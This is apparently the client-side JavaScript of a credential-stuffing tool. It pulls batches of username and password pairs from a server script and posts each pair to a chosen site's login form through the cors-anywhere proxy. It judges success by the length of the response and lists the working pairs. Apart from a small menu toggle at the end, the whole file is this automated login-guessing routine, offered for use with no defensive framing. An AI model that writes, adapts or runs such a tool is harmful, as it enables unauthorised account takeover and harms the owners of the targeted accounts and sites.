var glob2=20;
var ccc=0;
var cyc=0;
function get_base(){
  document.getElementById('get').disabled=true;
  $('#get_result').html("<p>Загрузка...</p>");
  $.ajax({
    type: "POST",
    url: "action.php",
    data: ({a:"g_b",ccc:ccc,glob2:glob2}),
    complete: function(){
      start();
    },
    success: function(data){
      for(var i=0;i<data.length;i++){
        $('#get_result').html(data);
      }
    }
  })
}
function start(){
  function go(i){
    var lgn = $('#'+i).text();
    var pwd = document.getElementById(i).value;
    var target = document.getElementById('target').value;
    $.ajax({
      type: "post",
      url: "https://cors-anywhere.herokuapp.com/"+target,
      dataType: 'html',
      data: {dologin:1,username:lgn,password:pwd},
      success: function(data){
        if(data.length>5500)
        {
        $('#set_result').append('<p>'+lgn+' : '+pwd+'</p><div style="display:none">'+data+'</div>');
        $('#set_result').append(document.getElementsByClassName('btn-group pull-right'));
        document.getElementById(i).style.color='green';
        cyc++;
        if(cyc==glob2*ccc){
          get_base();
        }
      }else{
        document.getElementById(i).style.color='red';
        cyc++;
        if(cyc==glob2*ccc){
          get_base();
        }
      }
      }
    })
  }
  for(var i=ccc*glob2;i<ccc*glob2+glob2;i++){
    go(i);
  }
  ccc++;
}
function menu()
{var div = document.getElementById("menu");
var btn = document.getElementById("btn_menu");
if(div.style.display == "block")
{
div.style.display = "none";
btn.style.background = "rgba(0, 0, 0, 0)";
}
else
{
div.style.display = "block";
btn.style.background = "rgba(0, 0, 0, 0.2)";
}
}
